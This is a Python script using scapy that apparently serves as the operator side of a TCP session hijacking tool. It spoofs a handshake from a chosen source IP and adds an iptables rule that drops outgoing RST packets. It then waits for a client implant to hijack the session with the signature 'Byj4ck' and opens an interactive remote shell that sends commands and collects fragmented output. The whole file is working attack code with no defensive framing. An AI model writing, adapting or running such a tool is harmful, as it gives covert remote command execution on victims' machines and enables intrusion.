#!/usr/bin/python3

import warnings, sys, os, random, time
warnings.filterwarnings ("ignore")
from scapy.all import *

if (len (sys.argv) != 4):
    print ("\n[ERROR] Usage: {} <SrcIP> <DstIP> <DstPort>\n".format (sys.argv[0]))
    exit()

sip = sys.argv[1]
dip = sys.argv[2]
dport = int (sys.argv[3])
sport = random.randint (2000, 65530)
sqn = random.randint (2000, 1000000)
signature = "Byj4ck"

# During 3-Way Handshake we will receive SYN/ACK
# But kernel have not initiated SYN thus sending RST
# Avoid this with iptables
os.system ("iptables -A OUTPUT -p tcp --sport {} --tcp-flags RST RST -j DROP".format (sport))

# Initiate 3-Way Handshake
IPLayer = IP (src = sip, dst = dip)
TCPLayer = TCP (sport = sport, dport = dport, flags = "S", seq = sqn)
SYNACK = sr1 (IPLayer/TCPLayer, timeout = 2, verbose = 0)
if SYNACK is None:
    print ("[-] No SYN/ACK response received\n")
    exit()
sqnRes = SYNACK[TCP].seq
ackRes = SYNACK[TCP].ack
sqn = sqn + 1
ack = sqnRes + 1
TCPLayer = TCP (sport = sport, dport = dport, flags = "A", seq = sqn, ack = ack)
send (IPLayer/TCPLayer, verbose = 0)
print ("[+] TCP handshake completed successfully")
print ("[+] Hijack TCP connection on client-side with:")
print ("\t[*] Destination IP = {}".format (sip))
print ("\t[*] Source Port = {} / Destinaton Port = {}".format (dport, sport))
print ("\t[*] Sequence Number = {} / Acknowledge Number = {}".format (ack, sqn))

# Waiting for TCP Hijacking with signature by client
print ("[+] Waiting for TCP hijacking by client with signature")
res = sniff (filter = "tcp and host {} and dst port {} and tcp[tcpflags] & (tcp-push|tcp-ack) == (tcp-push|tcp-ack)".format (sip, sport), count = 1)
resSig = res[0][Raw].load.decode()
if (resSig != signature):
    print ("[-] Bad signature received: {}".format (resSig))
    exit()
print("[+] Client hijacked TCP session successfully")
sqnRes = res[0][TCP].seq
ackRes = res[0][TCP].ack
sqn = sqn
ack = sqnRes + len (signature)
TCPLayer = TCP (sport = sport, dport = dport, flags = "A", seq = sqn, ack = ack)
send (IPLayer/TCPLayer, verbose = 0)

# Start to send shell commands
while (True):
    cmd = input ("$> ")
    if (cmd == "exit"):
        TCPLayer = TCP (sport = sport, dport = dport, flags = "FA", seq = sqn, ack = ack)
        send (IPLayer/TCPLayer, verbose = 0)
        break

    # Send PSH/ACK and Get ACK
    TCPLayer = TCP (sport = sport, dport = dport, flags = "PA", seq = sqn, ack = ack)
    DataLayer = cmd.encode()
    sqn = sqn + len (DataLayer)
    res = sr (IPLayer/TCPLayer/DataLayer, verbose = 0)

    # Get PSH/ACK
    # Output can be fragmented -> If so each packet contain "|FRAGMENT|" except for the last
    res = sniff (filter = "tcp and host {} and dst port {} and tcp[tcpflags] & (tcp-push|tcp-ack) == (tcp-push|tcp-ack)".format (sip, sport), count = 1)
    finalOutput = b''
    output = res[0][Raw].load
    while (output[:len ("|FRAGMENT|")] == b"|FRAGMENT|"):
        # Send ACK
        sqnRes = res[0][TCP].seq
        ack = sqnRes + len (output)
        TCPLayer = TCP (sport = sport, dport = dport, flags = "A", seq = sqn, ack = ack)
        time.sleep (1)
        send (IPLayer/TCPLayer, verbose = 0)

        finalOutput += output[len ("|FRAGMENT|"):]
        res = sniff (filter = "tcp and host {} and dst port {} and tcp[tcpflags] & (tcp-push|tcp-ack) == (tcp-push|tcp-ack)".format (sip, sport), count = 1)
        output = res[0][Raw].load

    # Send ACK
    sqnRes = res[0][TCP].seq
    ack = sqnRes + len (output)
    TCPLayer = TCP (sport = sport, dport = dport, flags = "A", seq = sqn, ack = ack)
    time.sleep (1)
    send (IPLayer/TCPLayer, verbose = 0)
    finalOutput += output

    # Print output of command
    # Linux: sys.stdout.write (finalOutput.decode())
    sys.stdout.write (finalOutput.decode ("cp437"))
